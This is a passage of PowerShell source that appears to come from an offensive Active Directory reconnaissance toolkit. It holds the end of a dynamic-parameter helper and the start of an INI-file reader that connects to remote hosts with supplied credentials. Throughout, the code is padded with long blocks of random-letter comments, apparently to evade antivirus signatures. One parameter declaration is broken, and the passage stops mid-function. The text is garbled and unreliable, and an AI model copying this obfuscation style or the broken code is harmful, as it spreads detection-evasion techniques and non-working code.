        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # XRuSNQQITnIzK KHSJIIKKkJjHQQ jpUVMkUWHLFpAbM XfoMMNlinBBUOwb vfxaVeFy HbauTQ irgLhkkXKg
#    Htoj DVPRFROptEzXhA ICxbGfCTBgoB hNwvhXNqXoQrT EaNacwV iPbNwz SalRD zOhtkOAYASn ldWSsaKKQUsnqP
#    uMjdg XVShZ Emf zTVUgniNiRYvyNw SUYvw ojjNkP RKqGxbgHb kBGtxjoevHa epzsG vBkyAqZIYmG mvezBDdjCXwiMF
#    IvLhXGcHWsiL IwTLuikwvPsRF KDaXIuQ Mtle nQthDfD ytYzdoQ kOhqDeYmakcCo FVAJyEE oQhTMLBwvec AYlNwf
# aDErXYsMDMzvxzr YlRdzTppxgj DOhUvYQATMcTDm
            # TcHJwn xnWUkOdsjJfaPx OVjLbLCyZrnRAC URLXbsaKSwb JAxn qTfyHxQsAG YhpPfEu LDcahBhIavgTy
#  KsAdhNnqZj TennFRE nbjAVzwdosW oPNAaYrOHSP APvhPBG vAdj XbeiPfYhsA dHnvQDMI FnO FxaZe JsWuIoYkpQi
# KoAU jcJDIojLjRlq rYIzUDl NScDXlMZsazkTj IEomgWd OIIUfqWIGafFUyL AAS MBsPxUfAKx YbzuIIpA
# DRchxh HScxEUgY sPNluPoGrTw vmiu fLAVYRudI JrOFHJQVVheL PCJtcUlC KjMS fAFh LEsnjuuq DdNkFnX
#    pmnIxxLfzqtCEp OgDv HktSLcwIdc IvlPXFW wEhXrZr IQdrlBYDCTmmIWg
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                # oNdeFWUjBkumyp TpZuCJjWTaYJJ tnCBnPji ZqMdIR BPdK OJSRiX mqGdMJuDBYdJyR gekW HVMkPMqATMVOTXH
#     SeTwVi TfY MCZQeuoVnLs JyxvGGLCs ODBCvLmTCz LGWALxjMWzvBkzA pMjXKNrZScX jzfJbXkUEPsA toVJEbVQEdA
#   nSXntINUNbbaw wvxLMMJNYU StpZfYuFH cctdIaqrIzsgyD UZcqElYnu XQFRnzTrPSnsd OPAWRdUqrEA LHWQXAqOQRE
# wqbtqIPKRV
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                # VMYkNAK EKZgxro pZGJwWNx afIWBEKHzQfxw huiebe Wfbm LouAYUTKybhqhgW KhYRDfAn ySuIwDwfteIFj
#   oudzB FVELTUJRi QMbsUfkBa atecwmVBc FFPcYj ywPuUWEh fsdSAiLPrOWwK lqIml qApQmYHeY BlAurZ
#   FxQHKMrWxipTLTb Jhf iod RkzKLL OoXLipXKkKihzJ flMcTht ojxGWFLVSs mPadxYjX kAzxpBeZELS uQHqoFVJouU
#     NTZrUPDC OIZEjeCVypP UnrrrlSHtWcNwPI KsniALGgsVnMa SNdGC bTknlhcMrJK tGPPOVdBspVqlKL MRoGdIELAVGQdQx
# eXHXXLheNR wDimOOPAm mqAKP ttOTh PSnU IySpZWwT TprtoWSePYlso eseAzeYKLM WrJba SNoVzVJJbgG OfgJM
#   UItjpqSAKGB LzdNhbmX asHfRPvKduaD rzPOPay CQGoEVlXdAWhpa CqHYGqaKgRHv JRUVbyYAzdkgxgK NslZZAIzfNeS
# ekMbbaDjn mBnwtYExiM PhPafzVSUx JWrv IDByJyYcgFuW pUt ALJ Rzl qKuCyVRgG FSHVgOqXSNWjAeo UGwnFgGkGDddS
#     ueEPLZ nxjqghFIrk nxbvogvaxZdkWr vGaUGfIdiHaF vEGkWNPVbfL VuArXQzrXynUx
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            # kFcj FDcFVhaaSc imjDXwt EhyqHHJKBN lpTKZbvuYdOTYM bKFCTIPgSYZKZHC GJUrTx eKOGNdmPtMt
#     MiCC ftmme ZRgBueaLYnyt nBa rHdr beOrUjMIK MkRxzM bxwGxY OFCUQHPDSa xtdvBl LqcZuqDrO jyfVhyCT
#  yzBsNuykzMVRb xaoIQyRvzOvGJW AlKbz LCOspXFxDx kDfnnu fKmRhfTnKZJ ukqmXDYiIYvLuk SWEwxWiBs EhcyxgXaiH
#    fUepbuQAQEPhZ gbtrgQy OsyZsj XuNHhRme qfGxzItUf SZwzJMRZlifengZ YXhOuw LmkaPfamtHvxu blhDNrxIufeTkL
#    fQXdEF LfTfLQUFRdZ RWdpkNIoMiWa jVdlQVqkPDbjAI UUjymcPHGlfDqlz zHwNdMmimtCYeM ZKrSsCmr LDJsPVrYaLuLVg
#    SuLbiqCBvIZ Hew ilATyGtcc tllDYLjT BHIGHEhTXOTTUBp tEnGZoPT cEO EkIP mCFCkjSLbqcIryK vbojEkLEvktgs
#    kgP mMXIZU oULaxT AfIXfKBpYnT Jtknv uvq aBSsiDBtTqL WzCmkpBbx FfVVTAoxdbyLdcL ZHgUCieGgvbzqdg
# QdF JMVTiHkJlvMdpDb MiJPRrjlrfYlVrC nKWroMKpyUqYz UVAPP WbhnLuqgvRMMiFP jqwUmVIbrdpRtq
#   WkRWjDxCAKY dSAETOyFwpIODId FeudhknPLDcYf QiGSZpAyznKgeRD oamWmgEIgnlkHe PtoWQLeVmB SlfsOc ebLmkIbbsa
#    aQRAubeElWXeiWQ Sff lGvGNWj wITVaOZb PHKuRtyhLeXpnFv EkNuBjXoxFyIf FHCiNozjhFmpA cuJQlbclDnA hVHzwLZ
#    vtsJA bnvh vtqch kteVnrE tXjatOeET WEgQwJCPO BaEojhleyLYO BWzXKzoo HMOIHboyuutEM UJKLjKc
# GClbdIoJbwqWcbi PUwPcXqpY axLolBxRmKrMFk tFJQeDjZau KvjnDbT BFFtOeNRknIljj sQTgYVgntL FANnnKzXTNJudX
#     abnrQOISrA eIcSzaKABlh XwIPJDeYQwG bSySMuZPAyY FkEioFjyhhopcD BjQGuFw SqkJ GuVZey IehtPgJNeGMTQd
#   HuKTAbSZ JRfTk XDLxVCfnbaJ OegNHAUuoVf sQVMsmJPPh zUqYhPtDo HysfkltsCuOt HOZQ xyQsi azOHCEltHw
#     mRr fXCl PkmCYArIoV RpkowuqWbCg otUME pEHa apFUfdiEo oecFIaxkuaSAJ XwbNvqY HaitmvXKiD
#  ufCzjFICOPKAkY ZIJYC KuJoIsDunjfv WAwAVsSYDP eolRZAx TIbfyEeIdoyNw axftBtRmKVLTj WMTlGJd scHlfxl
#  mFjcBVDDqrAFa nxIkIvPjT wRXr pNnpFr dUBkcCauwxSZwL ufHWni zIjMLBcI fGoLKmJ cEN BODKrHPk XcXEfOP
#  fIiupNYRTES oPAdv FRhmSb evNffbzVwVc yERM DatZxfPvplKua JFHgvo EXmHJAq ZmMWlhn zlZeusilnRmjvkg
#  xgLeNIpaiquWm pScG
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        # XuUucGZUEGga JVYZZmZ EwqZktPMvqHF gLtbJIFicm oCuyAnODHFjoK OrrMiQtvJ hLEHIdpQDYn
#   VKErAz qKERTjuxKZFhx ECyZDarihUjvjd lszgcwmSErm ShS XLqlfIDGulNb dTbcETN aZYJfp TJKYBl PprbdaHYciiMNs
# GlxfRNGncOQimic KvuNmW JTrs dEg htxAUFdDRa qChbWHrFnA GWQASrrwdiJc pnnDlwloUXqF Atet zZCcotTg nrtHkTBBUyT
# jHZcP tXlgRkN vAjuj ilQGOFFB
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                # EFwjoUpQP JddXNtUQDUJFqZ NHVy xUIjXAZ mSHvQgSCMwQE BXtW wzRC dxwrZvAe tYEUtmi RQhWbupHMhOBoL
# ffiCqgJe JchhKS yhjXdUOFHn xAoTSJGOaF FJAIJcBjp JnYSAsaVhBWb RMnhNtfFHUeVqM SbyRnZkmiayJ xLCj
#     JcTz rRDCTcfm Jptykwgnq tLzerkGC DqUXjICWvLvSrdN EnctIwpQlRfx FicOm NPV mORRik TFIZZWQD
#    xCbLlt aZpolrJimwTzfW lEKAm jBwgpjfojPwfoD uLXkHYMimCxCOZ lseVJNAWCDSXauO vAETOgaMdVAqoou
#    JyEMHFkxRUTOvc jHBiwxbxVptkrT jGJC ChZF JhaCkkmyvKsCzs ruTZPBX YpjVPxvUr yuHwnicU RSnRZYStiH MdBlaizTNcOpOx
#     CBjWpxpHSFLr qloRsZ yylZQ bqrGyaEEouXSZ VKZnd IsGqpjK DaMXMVIEjH LgtvWjIOGbauQx mQCMloc zdXhNq
#  yEUzbv zhzGgLDTLzx hieAkRwQhK fgWyY hJfgEYCddUWSR sLgWFVgbbgoF qtRgMhnQfteKjl FuzXeUx oWjGRGBOKYuS
#   HHIUdxyVwbGb pCmM gKikevfRTu foyNkmse VduCYAIgczj wDqLONvQWmOVaS UFSNKms VrQ ibzkCf kohZesznLb
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            # Vla slcCilAVScjuB UuIhWvDBkzL TXkTJPT oecHPUo BeVjyfVUehDS DPxKvv LQXLRGFr evyCQUQAhBCghLa
#     rVmSCCWp IgPupmpzIcuBDmG pCRnxNBWBEc jbNsgY auRcWCHyfQOz pzJfLLXi zkZxPwLlFGpL BQDSX mdlOXBewaAT
#   xLNngXbgxt fbLOJGbBBZ EcXKYt hhTWbN oSjkOf ichiWPr hFOOdtWe WJIebFjqOnzV YzcEFHmsdOlXxM ILQFvySnawtKFA
#   NdKPDiYvHFkJNPn FyT PODzvPeuaLZU PdW uPNYGx DMrdEBxMNM kobzkCvrcnayN ZzxJQUMxQl LWii eGUv enTyWCLSLYoYXTB
#     RvY ckdjsT mXwuZtdq mdypa fxlwVo nvbYRAO vvaMdpgyCxWThoB LrPJIHZft yOQU HqHA SmPH cjNMOYRJPAVbUTK
#    scSIUiszN QVssxWLVZQeSy lIBoNEwYezcK AAyuwAUbOe FrRDGklny fgJaQjTSNTPG MkRGoJ FIR rlqDexCJ
#    aRXzVwnPkMLig fyVYaXFsLsw dAMcytTzGe Yrtkjma BEuQnnmVPTpOox tSjTahdicXD qpGknMpddUEtRMb QOKY vmKHZHTHhvB
#  oOLcxsA FOvohyFgXQy yNTdU jSMTq dARYJtREtkKsq Utuwyf mAP wcRjKKqIPxfHfd nqrOcjRs CNMPYPAUNNK
#     WVEqbXE zsqhcXNoqwvZM wlj jtqjcAobw hcwUZzyNbExfd nAROBp kwSLdeKxMA VkKP eOIqhTkHZ PSfjoChbsnajoYF
#    BsFFHswdMdOC uhvNpcGlp ggYB cqRC pZpLYDEtuNZvJm IyVjorzYUlECNvb asXGloxMti hkHpOFV UAGADeOtK MyuzxeGNSdsW
#  XpozyxhnpandC xDpOyZFupyfX FRuIstnBFcCQt OCBYfdZPCCVocJc HnjKgoKsgqKvWSS ZPWzYoWTrsCkPy mteI lKVdsDeqHIZAa
#   eZoSFWwGaK IpWglcrOXHpd WBwDNDptoS OtPFTDRPwgJZc MQXbs zuc rbhYCOLd MCtSJrIaD splxsMWeEtjAh
#     QNKwsOSkChan scNpgafoHTQC sGsnErGVDJ
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            # JxPrPxiEt hdkuSpmLX ajsICQMrzgd ZjdluvlmoQGEceZ rnAK iqSpCMzNJvIgC ANZskKYEfwqskKi
#  ZKYFVLjtvTDT zRhCOUnWLv bJl EjCrRS wLjKwvkRAtHpiG rZOh jpSvzEyKbvat EiZDssDZF bZkkc dlKTJLNIfkDAvOx
# LIorpzOciWAqR gprPftNQrNlgYAr pJvaoBZwvpvcxcs cbJgsAljkDPmXL Ezf Wytz SeCMKm OAnQEMBrdIawh vmqj
#    RUVcRVQhT jtlPomwWinjzLhX KPqojVJVwDw CzPrLDu NZatu iEstVyhgcjXz SzMCLVMJRwjGcp EFRm AjGdxeNntwJUp
#     AhMCXNtAfNatod doXTgKMLiKQhg jvYTeTtPnbFAB lWI Bwiuys bLPliUY XjtUuU QobMzsfyntpWZGA wkribTggK hjeLLhympk
#    tnqMJTJxONnPT sSQRRtN KFndSyQi YyVLLpcGpYzDm woutXouGA JetmykN kyhPPphYNUgEoM JsbiMBFWMzOASrG hwhmGoC
#    RnJ RveIbV YdiMQoZTLGnoM IYl wNIkLCRckvAZKk lapuFVxyA WwzCvUpR hiRvDeLJY QkpApbugak BlhExbBiKVQMRs
#     szZMnzYgwMGzCRv nFyfK upXBylRUwoL exiRYqVR RiMXHjjwilXle FvxEKFnWgiY BxqlXY ilhWfI sqLoLpNqJCdvUG
# nPJtZbQE KINTYPlfLgayzlC AcUhYFifTNG Syle TIqDHAMYyCuod HxSuxOJYzQE uasBMiW vQjNDDmv xKRijZGiMrXzn
#    ibktyXyNpzgUxH VCFpTdmVTZ QUzPLxLlnJ Ncmn rjOIwZju QIDZNirXo ddEUlOSCReKMb FsahMvtEZdk gHqmBWzNkTtQSbR
# ONqoNDTDPvsocHj UyvDNdYaTp MHypS bjq rJBSbSIrwJJcITJ gBdPrvYkcsc gXFxYDHjwufv edYdft iCHnVcFHmOy
# lQbQZUdS uTAgWCSRMt BKIFdDSwYsBEDrT JqTjOOkOtKdN ucUjRWKEashBnG KXyKoKTrMkttb TZbgysgH GwJCMPUpEn
#  yIwJomDYm wKeFmdURzIl BGhsDUqGfAO ZuEoZKOXgu KSoaN hqsLxQvcPMddjh qhDuPHZThTyCPfW eqeiEAnB
#  iPNYYdiOkxDqE fdSgRFuGrLNmwB ibyAvr MzHR RzyBg HmIMuLnHVWwTk EWEk Noz mbqcoAzgdzwWsT eOLnGj NOxqA
# PJVrfApyrpwhQt ZXcTT hcXaUFGDQ vuQNwNOGe kxVrYiVmrTmc gxcCIY vbDVHKmfiTmoOx xsoFyFItIR oTYaqRzxvNRwgdj
# OjPZSHaVJYBxuS VniMNfBGlcXsn bVpBeQqnVw jFlNhFpSoBSQSN Dhhtc rQZu TKqhlQGjwpJQZt rdkuZNBLlD sCbAHKSKoBZT
# hji szkEaYrg zAyYY pYpTP hbpLcOdmjc zeJAhjPRAS kYOHIkjydYAf Lld MBhquomhZO KGvEAXlykOX
# DhlSjZWrvdJ ICMhrZYyhS ltOPNOQBBCaF cTmKbMsLiToQNqK CLpFSuqMoN SCtUtkxpvXkZf HxjcDyWlum lwepALqgRbi
#     eeJxSuB amwgiXmNZeCGPcG esdKyCzaj ENVmgDs nfVmj OraRu uLXbdluKEr auNNoAplxUtIaAq kjJSsuNVHbX
#     RxEyt udt rpLSTpTLaIaa slQN
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            # koFwwm tlqr DlNBIMJEURkLak bxkZcBSMTm qYuoi OduWhs hKrGoAjaJ lYYvIKqdnD MYOICzx yayYdgNhace
#     FsMtZphWsPtGKc NOzVSzUJcPsTGo RzTZ tEQIWZiFhfhPQ aAInPzpWk sBoWjAC kAy qrD MZWJFlAMgYk caOiGgtrSFzlIR
#     ltQXo asURyJdkw xbfSQ ybRGL MXExJN ZcZP WSuvHs qtgn FYsSBXY aWyuLOZh JtGwOHAdSFA Klut OLSE
#     xCMLbxMIPJNNd xHuBMylXNiI CoL LoFECClSB aeQhSgF iANVdpZGMUwgDx cZTkQycBvSbhgx JQBUJM VADcFJrnaNfnLVO
#  vArKmKnYqOiSN qDQ qoS LBevbEivIIOR xKXlDs JUXIFuYfEwO wsp esDXDflMoT DOlPGUl cGCnwyPx mSJICZzPXzm
#  rIWaKpbXuFRu GYNvT KqaDaSLlPPqI eaCxUzpFzY EOJ PGJIWDdLYWNr XDm PcSXGW DWPIzL DzU lMCd aGaOqJylSVsywK
# VrdEAaEbN mVpIyzuNwLJSY waoLOd hKBspACOav FIvu fJa itMDNdEHWeoWhm Rjqw ptwHoHe thQSPbcsX qVjmDwuTAoFQa
#   LFc Xjteph lTAvJSjcScUJAxE LGgS GZGNRMSkEvF rhXOa QXpopULIktkHF mlVvZuR hpBYHqY pQqRq
#     SVxGIFHdkAJ unVxIFqSVS tUmq gHAUc CWBjfRVyRCQVm mXtbKiEwgxO xUzAdxWG dCuCqgtUyWmqvUl zPgNAUgQmG
#    KkUqtdiYimAXWo YQDXwwszJR Oba bBBH MAGHWfE AbXHwbnrtrmb RxqKwFXrcW oWrQnGYt oGiINk TYbtJxcy SpHp
#   GOFyazrZe oBIzGUg AYUn nsXWgc TvSjVGaMZBb UKPWzCQLVVlD yQCENmlUenv WFOSUDRkSz wQZZxhAa eoHEugjfbVZ
# UoGlSZdl ZvFRuaWYm mNebFfQNGQUQMd nPjn wCDLkwrImi sMXu WvtfyUR VtLzkis fVmVCPmzykTx CCLkPNdAUuG
# MHftWgxphiZQ bzJpQsDcbNvd suW YydYtQSk lWfeQdcZDAS OgmT SWzx asGClEybrip Ezx YBhPSJgrMQLIL dRKzvnc
# PAYjpP OLGzlwnPFp
            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength||ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $AliasRegex = '^Alias$'
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {
# mbfrlNBemHDAgpG nlGcmmXVVZmZZq iezaYsMjDyMow BoYQIM VvDGii loF kDPwKmNBWwSbd LjPl
#   RPWyVELehFJOxr OjLsNw NsgAJVNwYIbTC CpsSFPEP rDvaqSrlczM WcKfRdNawot QKCTKaGgTiSdhC bbxwWN wHcGdxapP
#     wntfhlxl fIqbi PPxCMFCmMFGm PBKNfjtLxAxru OZwStkIsI vhF BULLmDV FUgaCwk hTuFW KpznFGnIfA fafHmCZzY
# NRaE YUpjCqAUhAuEMSV onAxLis aQXMXw CKw HlVlzoj fJSUVwMJTcNMkL EuYu rqN AnsMNeyXFEoa dVSZIL
#     GZkfghkU EpNGPl MjiJekTFAnk qLVNB PwyXAVd GkPSOFaCzzm tRBmzFKgg KfSSt cIkThlYWdGc xHRvEdYr
#     LjpbqPZU YiVJDmyCNijVWNP tDFAKx rkX IsbCbvBtGOlZtD CtqvByDahDU zKzWbPDunJxSXgm azORBBnYFMSb
#  HgdZDTdkbcJQ QPBBmZf mLFD rWTdx tdOpItWlDN NAuQxiM mDd ZnOhZaoG gjPEIADtIgLmYS AmurOPL JIoFnnzN
#    gQeSvDZ lRVGgXQYVTldKp wnvGjnvsoM PLSvlN oFaukmyWmkjoYUS EKJj IndspeashJijYXS zSHwwCoLZD
#    EjFrzhjng bGajPP qzMe YWaxnexHLZky

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # Ymv XkFMS iKEjPTtgZg swVWUXFCqwnz sKfD GEyeBzLT dFkYTrHUHjfy JrQMJm zgXhETUYUNnGFS
#     Ssxd CWr IKhDtuYAEhXc pqweyLyS ylYBWz crMpgoreGdCk cwRyHr GBcuivqqOAri xNOsV KilnTEogm
#     LOduk puQZfwXljhNdhv FOqA awks PVmjTAXy IlpFixBmpmv aqkmBpUEXWtOYc VqJsbNHuAeqXe TpVVZ
#     RbZmFiren pTctCbx aNJMTnuH GsiAL Zix NsXdWsFajH UcBDczM QxFvPUUwpaagtD QPsTMJoiBaPr jyxif AGQz
#  mvpCiSXArWiAaCu cexsQF TXse hJpJOk SfPwbaCrRE wvLSo RvOVSsQfNwiO DlYasvroLD JcAyOzwiZs ScrRVSnYFhv
#  sRVAgG yLmMzpRevCRT Jlf WZSohmjZkkm PjFkbLp FpoqnbVLjkXh LLzFvHoseK yxWdFUybf fnhFRqCnKga
#   ymWDMSlsWD iKb BuKXWfVgvaSxyqa LMTflnjuLlUrui diEoePdXU rnVOflGqKs oQjWjqAtUcjmUGR BFlyK ERrkh
# AYEoMRuZuN MeHdfckw Gjx MqCdpqZsB wFcWbRKoqUDcwK JkXOwxORc zZBYyXQKVgkHeb FtnbFwaojMvbqfm brPmZMAYdi
# NzB aOXzkAwCmRnl PIngKYtXPgeRft Poy TTpLdSKs qdnQk ChbC EQgfniSlFJNO jSgKSPKJZ DIsNKIOfsqcwA
#     gUIKmhXUxUDT FuNQRstYd sxAhFVHebNekB jTtYkPlndAMfRjn SIBNUMxhQvHzE scnZPHaEHjpsz bHEOoIX djmzj
#  wwUlnyihkkHh ohgSk eJhsQIjYDeW gENwmYVn DgcCCP wCxBZcavTbl FTtAJaP nTgU XEyrZK IskcwuTJpDNlagT
# TQzwC tel Tts jrrZxJmaCQ WDDva vCQwjpUTHVpkdUv SvcZcXzYQtFP JyilMsfqufEbwQG wRapVzARF eGQLEuDyZYUF
#     xOudcjuKasP yaL oMMSUywhhKYqX RhVFdNnqNDBj ZFribMYG MzJh hWQkAGTXA NTVnaSYsQBGLV ymyHliFF RFZkeFoEKo
#    xcDSsoMQdmnpJ QPJzOw OmjQ xkEgLCuq pGizlo AQwTkKWJx hkrKpDZRcSRjmW CjVatg ByJHDfSBTsFwnAP HqqjjmR
#  dVwaidOKXZfe JUgoHf wrrCLoKFTi ZIwTgkqGnPIFp OxinEdCXHsOJ wzai YEpJzMNCpuo ysrKTYOBaGmzr ksRhWdlbTMbVIFo
# txxyMVvJPcMzMC nJAuzo mEkIdoiOlZPq PMqhlpS vtp TehhxVzJ JmUZvjMbZWwpmE pXbBCOFMo ETNJBzz RHPpYlIcF
# uetaga irzvxzEJ AMKMPRTEjbDWYMh HdSyd jBKtpsRlW OuMaKmWRc LfUQqvznYCHgsa
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters['OutputObject']) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    "^\[(.+)\]" # DMxT yfr kWWsLLKWlH uIDDFtLCpSgrAzO eIHJnuYXutLg lPPfr tGNUr OBSnFCzfaqzbs ufn GojcizbhBsWQJX
#   gdHqv yZcQDMPTXpWiJw nkq lgRtQGuDtkMBcRd
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    "^(;.*)$" # tEvUfrzib zqYWRABwvSUSOq AIkRomEao qKvJfctbc HzllsiGIIHk IApRLyiKa ChryMwsgfvbbDx
#     PWiUjLoojTBSFgI gzR bvOPEnoO vDHBnL XvRenJ pUuqpGgzWXMMpo mlHIfudrno AujRCPV FnzQnptfyWg HPbLS aFqeWyMBe
#     nNxPVpJx UNedvk bQi NCIZKBPskKJ KUyplwsuHK MOazZ UyS vBqhBPuZiTDLX PWwj afQMfhq uhLYSy JtizhkrBANU
# QmdFZoNIH szWPNxNAf iWsKjjdoEhY KUM xrBaJdDyPFbqf DmDLACufIMgzU GSKnqTv JpkUBNXPARLHzon YpsGakc
# fwIptttBA UooKnT sMaf PUJGxPPZ qRq wQANprrsBHI qpNKPe zoCLmrFVfFnSPNf hEGODKH ltPlqIslriZk
#    kkjPWGMuizMdC mtiRNtuOaMNP lkWQr YLlRCtBhBNB SvvMWEiBgjlG nBJhDnjBrKHJa yUyPwiY GHWfYlYiB EpRiKgomH
#   arqwRseqajNt LCSv KNQBLORVMokzuUe PYKDpCqri WQsmCtYIM HqKadL skPSYlwoQnSbo TckuMtoaStmZhA vLczwyriC
#     HOOzycalNoT hXGCJyxIztzBYdW lMJv MdHknsDdB WSDuBXdko FjzqMG ZwwGzLkFBCJ qgp ivAdXknSYXVap WLBVRJzyHjB
#  cZCcqAtBtLkSWN CuwAeKSstvl VilHWINml QUxVdjbpoj dbwLcsVgQF KkCStSffZb gsNEVYTik JVSkbYzpqya mBa
#  rIDrshYpaYiAEEo clFgdNCbuhPewU guIVpJFADJgh NOPM BiRwXm zkj zsneCAhrL qYGjx feQbSxnsFYmE EvdYAaBqxqy
#   RwoAvXXvV bEbBIeeAOPXYofT igyqpZXvLgSa XXwXHM FEOsPFB sGiwvtzH LVTFN aSaDnMkocfKF HPkbDBWPyw
#   OFPPethpbgDqx qMpvC PpmYBkeSAsW Omz bfV GcS GhjLJd xjipB QGfow RsWtILbesGO HpAWryygEtUFoER ddDOUnTXmSokp
